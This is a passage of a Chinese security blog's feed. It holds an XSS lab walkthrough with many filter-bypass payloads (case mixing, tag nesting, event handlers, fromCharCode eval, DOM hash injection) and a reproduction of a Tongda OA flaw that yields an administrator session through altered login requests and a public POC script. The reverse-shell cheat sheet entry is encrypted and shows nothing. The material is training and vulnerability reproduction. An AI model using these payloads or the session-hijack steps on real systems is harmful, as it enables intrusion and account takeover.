src&#x3D;1 onerror&#x3D;prompt(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 7</strong></p><p>测试div标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="基本混淆"><a href="#基本混淆" class="headerlink" title="基本混淆"></a>基本混淆</h3><p>大小写混合</p><p>宽字节</p><h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><h3 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h3><p><strong>官网：</strong><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></p><p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p><p><strong>安装方法</strong>：通过虚拟机挂载iso运行，该靶场环境是封装在<code>debian</code>系统里面的，运行在时候直接以<code>Live</code>方式运行，然后<code>ifconfig</code>查看下ip地址，在浏览器输入IP地址即可。</p><p><img src="/posts/46185/penter.png" alt></p><h4 id="Example-1-–-无任何过滤"><a href="#Example-1-–-无任何过滤" class="headerlink" title="Example 1 – 无任何过滤"></a>Example 1 – 无任何过滤</h4><p><img src="/posts/46185/e1.png" alt></p><p><strong>测试</strong></p><p><code>name=xss</code>、<code>name=&lt;h1&gt;xss&lt;/h1&gt;</code>观察页面，并查看源代码，发现输出是在标签外，则不需要闭合标签。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/46185/e12.png" alt></p><h4 id="Example-2-–-大小写绕过"><a href="#Example-2-–-大小写绕过" class="headerlink" title="Example 2 – 大小写绕过"></a>Example 2 – 大小写绕过</h4><p><strong>思路</strong></p><ol><li><p>和Example 1一样，先随便输入一下数据测试，通过观察结果，可以判断name参数的注入点没有过滤尖括号<code>&lt;&gt;</code>。</p></li><li><p>用基本语句测试 <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中只剩下的<code>alert(&quot;xss&quot;)</code>，<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了，那么就需要绕过过滤。</p></li><li><p>尝试大小写转换，输入<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中前一个<code>&lt;Script&gt;</code>没有被过滤，只有后一个<code>&lt;/script&gt;</code>被过滤了</p><p><img src="/posts/46185/e2.png" alt></p><p>那么大小写是可以绕过过滤的，输入：<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></p></li></ol><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name&#x3D;&lt;Script&gt;alert(&quot;xss&quot;)&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-3-–-嵌套绕过"><a href="#Example-3-–-嵌套绕过" class="headerlink" title="Example 3 – 嵌套绕过"></a>Example 3 – 嵌套绕过</h4><p><strong>思路</strong></p><ol><li>经过上面的测试，没有过滤<code>alert(&#39;xss&#39;)</code>,现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上</li><li>使用过滤测试Example 2 payload探测。观察到结果中有一部分尖括号被过滤，但也有部分尖括号未被过滤。</li><li>构造payload</li></ol><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name&#x3D;&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;&#x2F;sc&lt;&#x2F;script&gt;ript&gt;</span><br><span class="line">或</span><br><span class="line">example3.php?name&#x3D;&lt;script &gt;alert(1)&lt;&#x2F;script &gt;</span><br></pre></td></tr></table></figure><h4 id="Example-4-–-script直接被过滤，用其他标签"><a href="#Example-4-–-script直接被过滤，用其他标签" class="headerlink" title="Example 4 – script直接被过滤，用其他标签"></a>Example 4 – script直接被过滤，用其他标签</h4><p><strong>思路</strong></p><p><code>script</code>这个关键词被禁用。考虑用其他标签触发<code>XSS</code>。最常用的还是<code>img</code>标签。<br>除了<code>img</code>标签以外，还可以考虑<code>a</code>标签和<code>div</code>标签等。</p><p>触发函数有 <code>onerror</code>, <code>onmouseover</code>, <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;1&#39; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href&#x3D;1 onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;a&gt;</span><br><span class="line">&lt;div onclick&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;prompt(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;confirm(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-5-–-String-fromCharCode编码绕过"><a href="#Example-5-–-String-fromCharCode编码绕过" class="headerlink" title="Example 5 – String.fromCharCode编码绕过"></a>Example 5 – String.fromCharCode编码绕过</h4><p><strong>思路</strong></p><p><code>alert</code>被限制的情况。</p><p>绕过思路1,不使用<code>alert</code>而用其他的类似函数,比如<code>confirm</code>和<code>prompt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过思路2,编码函数名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-6-–-—–标签内-闭合标签"><a href="#Example-6-–-—–标签内-闭合标签" class="headerlink" title="Example 6 – —–标签内,闭合标签"></a>Example 6 – <script></script>—–标签内,闭合标签</h4><p>直接注入JavaScript代码中。<br>不闭合<code>script</code>标签的情况，可以考虑用<code>//</code>注释后面的代码</p><p>在一个<code>script</code>的标签内，先实现闭合<code>&quot;;alert(1)//,&quot;</code>;用来闭合前面，<code>//</code>注释后面。将<code>hello，hacker</code>的地方写一个<code>alert(1)</code>即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1)&#x2F;&#x2F;</span><br><span class="line">&quot;;alert(1);var a&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>顺带再闭合一下<code>script</code>标签也不是不可以，只是有点多此一举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-7-–-标签内—–闭合标签"><a href="#Example-7-–-标签内—–闭合标签" class="headerlink" title="Example 7 – 标签内—–闭合标签"></a>Example 7 – <script></script>标签内—–闭合标签</h4><p>左右尖括号和双引号<code>&lt;,&gt;,&quot;</code>被HTML encoding。<br>如上个例子所述，其实并不需要用到尖括号，并且可以用单引号分割。<br>(用双引号还是单引号分割得看目标页面的代码怎么写，类似于python)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h4 id="Example-8-–-有过滤，表单"><a href="#Example-8-–-有过滤，表单" class="headerlink" title="Example 8 – 有过滤，表单"></a>Example 8 – 有过滤，表单</h4><p>对尖括号进行的过滤，转义；<br>有一个表单：输入<code>xxxx</code>点击提交，查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO xxxxx&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>尖括号无法绕过，然后发现表单的url可以被重置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xss&#x2F;example8.php&#x2F;&#x2F;%22%20onsubmit&#x3D;%22alert(&#39;1&#39;)</span><br></pre></td></tr></table></figure><p>然后点击提交，会触发弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&#x2F;&quot; onsubmit&#x3D;&quot;alert(&#39;1&#39;)&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p><p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code>document.write(location.hash.substring(1));&lt;/script&gt;</code>，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h3 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://mysecroad.github.io/categories/WEB/"/>
    
    
      <category term="XSS" scheme="http://mysecroad.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录复现</title>
    <link href="http://mysecroad.github.io/posts/51745.html"/>
    <id>http://mysecroad.github.io/posts/51745.html</id>
    <published>2020-04-27T09:25:35.000Z</published>
    <updated>2020-04-27T12:16:41.290Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/posts/51745/login.png" alt="login"></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>通达OA是北京通达信科科技有限公司出品的 “Office Anywhere 通达网络智能办公系统”。<br>该漏洞可获取任意用户session，包括系统管理员。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通达OA 2017</span><br><span class="line">V11.3 &lt; V11.5</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本次实验所用版本是<code>通达V11.3</code></p><p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p><p>提取码：z863</p><p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p><p>本机IP：<code>192.168.150.142</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><p>登录页面直接抓包</p><p><img src="/posts/51745/logincheck.png" alt="logincheck"></p></li><li><p>此处需要修改3个地方</p><ol><li><code>/logincheck.php</code> 修改为 <code>logincheck_code.php</code></li><li>删除<code>Cookie</code>，否则不会返回<code>PHPSESSID</code></li><li>在<code>POST</code>处添加 <code>&amp;UID=1</code>，代表管理员</li></ol><p><img src="/posts/51745/get_sessid.png" alt="get_sessid"></p><p>成功获取PHPSESSID。</p></li><li><p>利用获得的<code>PHPSESSID</code>登录</p><p>访问<code>http://192.168.150.142/general/index.php</code>抓包并替换<code>PHPSESSID</code></p><p>或者</p><p>访问<code>http://192.168.150.142/general/index.php</code>直接F12，修改<code>PHPSESSID</code>，然后刷新即可登录。</p><p><img src="/posts/51745/success.png" alt="success"></p></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>poc地址：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">点我</a></p><p>使用方法：</p><ol><li><p>运行poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 POC.py -v 版本 -url url</span><br><span class="line">&#x2F;&#x2F; 版本：11 或 2017</span><br><span class="line">&#x2F;&#x2F; url: IP 或 http:&#x2F;&#x2F;IP</span><br></pre></td></tr></table></figure></li><li><p>获取到可用的SESSIONID</p></li><li><p>替换浏览器Cookie中的SESSIONID即可实现登录为admin</p></li></ol><p><img src="/posts/51745/poc.png" alt="poc"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/posts/51745/login.png&quot; alt=&quot;login&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;通达OA是北京通
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell备忘录</title>
    <link href="http://mysecroad.github.io/posts/40232.html"/>
    <id>http://mysecroad.github.io/posts/40232.html</id>
    <published>2020-04-27T01:30:53.000Z</published>
    <updated>2020-12-08T06:53:30.413Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2ecd4a544eec791c0147b382b21e4df9030d181064d1e183941dbd90caf7dc7f"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
      <category term="备忘录" scheme="http://mysecroad.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="shell" scheme="http://mysecroad.github.io/tags/shell/"/>
    
  </entry>
  
</feed>
